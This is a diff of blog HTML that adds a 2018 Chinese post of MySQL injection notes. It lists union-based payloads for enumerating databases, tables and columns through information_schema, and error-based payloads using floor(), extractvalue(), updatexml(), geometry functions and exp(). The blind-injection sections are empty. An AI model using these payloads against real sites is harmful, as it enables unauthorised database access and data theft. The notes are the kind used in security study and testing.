@@ -6,14 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://ghcdgit.github.io">
-  <title>Archives: 2018 | GHC&#39;s Blog</title>
+  <title>MySQL 常规注入 | GHC&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="GHC&#39;s Blog">
-<meta property="og:url" content="https://ghcdgit.github.io/archives/2018/index.html">
+  <meta name="description" content="1. union 注入2. 报错注入3. 基于布尔盲注4. 基于时间盲注">
+<meta name="keywords" content="mysql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL 常规注入">
+<meta property="og:url" content="https://ghcdgit.github.io/2018/02/19/mysql-常规注入/index.html">
 <meta property="og:site_name" content="GHC&#39;s Blog">
+<meta property="og:description" content="1. union 注入2. 报错注入3. 基于布尔盲注4. 基于时间盲注">
+<meta property="og:updated_time" content="2018-02-20T09:07:42.945Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="GHC&#39;s Blog">
+<meta name="twitter:title" content="MySQL 常规注入">
+<meta name="twitter:description" content="1. union 注入2. 报错注入3. 基于布尔盲注4. 基于时间盲注">
   
     <link rel="alternative" href="/atom.xml" title="GHC&#39;s Blog" type="application/atom+xml">
   
@@ -149,36 +154,110 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-mysql-常规注入" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/02/19/mysql-常规注入/" class="archive-article-date">
-  	<time datetime="2018-02-19T11:11:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-19</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/02/19/mysql-常规注入/">MySQL 常规注入</a>
+    <h1 class="article-title" itemprop="name">
+      MySQL 常规注入
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/02/19/mysql-常规注入/" class="archive-article-date">
+  	<time datetime="2018-02-19T11:11:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-union-注入"><a href="#1-union-注入" class="headerlink" title="1. union 注入"></a>1. <a href="#1">union 注入</a></h3><h3 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2. 报错注入"></a>2. <a href="#2">报错注入</a></h3><h3 id="3-基于布尔盲注"><a href="#3-基于布尔盲注" class="headerlink" title="3. 基于布尔盲注"></a>3. <a href="#3">基于布尔盲注</a></h3><h3 id="4-基于时间盲注"><a href="#4-基于时间盲注" class="headerlink" title="4. 基于时间盲注"></a>4. <a href="#4">基于时间盲注</a></h3><a id="more"></a>
+<p>====================================================================</p>
+<h3 id="1-union-注入-1"><a href="#1-union-注入-1" class="headerlink" title="1. union 注入"></a>1. union 注入</h3><p><a href="https://www.waitalone.cn/mysql-injection-summary.html" target="_blank" rel="noopener">参考链接</a></p>
+<h4 id="猜字段数"><a href="#猜字段数" class="headerlink" title="猜字段数"></a>猜字段数</h4><blockquote>
+<p>order by n(–+)</p>
+</blockquote>
+<h4 id="查看mysql基本信息"><a href="#查看mysql基本信息" class="headerlink" title="查看mysql基本信息"></a>查看mysql基本信息</h4><blockquote>
+<p>and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7(–+)</p>
+</blockquote>
+<h4 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h4><blockquote>
+<p>and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1</p>
+<p>and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata</p>
+</blockquote>
+<h4 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h4><blockquote>
+<p>and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库的16进制编码 limit 1,1</p>
+<p>and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库的16进制编码/*</p>
+</blockquote>
+<h4 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h4><blockquote>
+<p>and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码 limit 1,1</p>
+<p>and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码</p>
+</blockquote>
+<h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><blockquote>
+<p>and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表</p>
+</blockquote>
+<h3 id="2-报错注入-1"><a href="#2-报错注入-1" class="headerlink" title="2. 报错注入"></a>2. 报错注入</h3><p><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">参考链接</a></p>
+<h4 id="2-1-floor"><a href="#2-1-floor" class="headerlink" title="2.1 floor()"></a>2.1 floor()</h4><blockquote>
+<p>select <em> from test where id=1 and (select 1 from (select count(</em>),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</p>
+</blockquote>
+<h4 id="2-2-extractvalue"><a href="#2-2-extractvalue" class="headerlink" title="2.2 extractvalue()"></a>2.2 extractvalue()</h4><blockquote>
+<p>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>
+</blockquote>
+<h4 id="2-3-updatexml"><a href="#2-3-updatexml" class="headerlink" title="2.3 updatexml()"></a>2.3 updatexml()</h4><blockquote>
+<p>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p>
+</blockquote>
+<h4 id="2-4-geometrycollection"><a href="#2-4-geometrycollection" class="headerlink" title="2.4 geometrycollection()"></a>2.4 geometrycollection()</h4><blockquote>
+<p>select <em> from test where id=1 and geometrycollection((select </em> from(select * from(select user())a)b));</p>
+</blockquote>
+<h4 id="2-5-multipoint"><a href="#2-5-multipoint" class="headerlink" title="2.5 multipoint()"></a>2.5 multipoint()</h4><blockquote>
+<p>select <em> from test where id=1 and multipoint((select </em> from(select * from(select user())a)b));</p>
+</blockquote>
+<h4 id="2-6-polygon"><a href="#2-6-polygon" class="headerlink" title="2.6 polygon()"></a>2.6 polygon()</h4><blockquote>
+<p>select <em> from test where id=1 and polygon((select </em> from(select * from(select user())a)b));</p>
+</blockquote>
+<h4 id="2-7-multipolygon"><a href="#2-7-multipolygon" class="headerlink" title="2.7 multipolygon()"></a>2.7 multipolygon()</h4><blockquote>
+<p>select <em> from test where id=1 and multipolygon((select </em> from(select * from(select user())a)b));</p>
+</blockquote>
+<h4 id="2-8-linestring"><a href="#2-8-linestring" class="headerlink" title="2.8 linestring()"></a>2.8 linestring()</h4><blockquote>
+<p>select <em> from test where id=1 and linestring((select </em> from(select * from(select user())a)b));</p>
+</blockquote>
+<h4 id="2-9-multilinestring"><a href="#2-9-multilinestring" class="headerlink" title="2.9 multilinestring()"></a>2.9 multilinestring()</h4><blockquote>
+<p>select <em> from test where id=1 and multilinestring((select </em> from(select * from(select user())a)b));</p>
+</blockquote>
+<h4 id="2-10-exp"><a href="#2-10-exp" class="headerlink" title="2.10 exp()"></a>2.10 exp()</h4><blockquote>
+<p>select <em> from test where id=1 and exp(~(select </em> from(select user())a));</p>
+</blockquote>
+<h3 id="3-基于布尔盲注-1"><a href="#3-基于布尔盲注-1" class="headerlink" title="3. 基于布尔盲注"></a>3. 基于布尔盲注</h3><h3 id="4-基于时间盲注-1"><a href="#4-基于时间盲注-1" class="headerlink" title="4. 基于时间盲注"></a>4. 基于时间盲注</h3>
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -190,7 +269,7 @@
 		</ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -203,82 +282,104 @@
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://ghcdgit.github.io/2018/02/19/mysql-常规注入/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/02/15/blog/" class="archive-article-date">
-  	<time datetime="2018-02-15T11:12:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-15</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/02/15/blog/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">搭建博客参考链接</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/02/15/blog/">搭建博客参考链接</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/test//" class="article-tag-list-link color5">test</a>
-        		</li>
-      		
-		</ul>
-	</div>
+        
+        
+    </div>
+</aside>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/02/15/hello-world/" class="archive-article-date">
-  	<time datetime="2018-02-15T10:34:46.438Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-15</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/02/15/hello-world/">Hello World</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -301,8 +402,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
